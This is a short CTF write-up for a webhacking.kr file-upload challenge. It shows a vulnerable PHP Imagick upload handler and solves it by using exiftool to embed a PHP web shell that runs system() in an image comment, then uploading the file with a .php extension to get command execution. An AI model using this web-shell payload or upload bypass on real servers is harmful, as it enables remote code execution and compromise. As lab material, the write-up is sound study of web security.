# Old 43 Revenge    PHP in Image

URL: [http://webhacking.kr:10018](http://webhacking.kr:10018)

![old-43-revenge.png](/assets/ctf/webhacking.kr/old-43-revenge.png)

```php
<?php
if (isset($_FILES["file"])) {
    $type = $_FILES["file"]["type"];
    $name = $_FILES["file"]["name"];
    if (!$type) {
        exit("type not detected");
    }
    if (preg_match("/\.\.|\/|\\\|\.htaccess/", $name)) {
        exit("dont do that");
    }
    if (preg_match("/text\/|application\/octet-stream/i", $type)) {
        exit("wrong type");
    }
    $image = new Imagick();
    $image->readImage($_FILES["file"]["tmp_name"]);
    $image->resizeImage(500, 500, imagick::FILTER_GAUSSIAN, 10);
    $image->writeImage("./upload/" . $name);
    echo "Done!<br><br><a href=./upload/{$name}>./upload/{$name}</a>";
}
?>
```

We can upload file and via Imagick blur effect is applied. We are not restricted to extension upload, but content type which shouldn't cause an issue.

Use any image and attach some PHP code into it:
```bash
└─$ exiftool -Comment='<?php echo system($_REQUEST[0]);?>' usb.jpg
    1 image files updated
```

Upload the file with `php` extension:

![old-43-revenge-1.png](/assets/ctf/webhacking.kr/old-43-revenge-1.png)

Check shell access:

![old-43-revenge-2.png](/assets/ctf/webhacking.kr/old-43-revenge-2.png)

Get the flag:

![old-43-revenge-3.png](/assets/ctf/webhacking.kr/old-43-revenge-3.png)

::: info Note
I thought this *might have been* [ImageMagick Exploits](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/Picture%20ImageMagick/), but it turned out much simpler.
:::

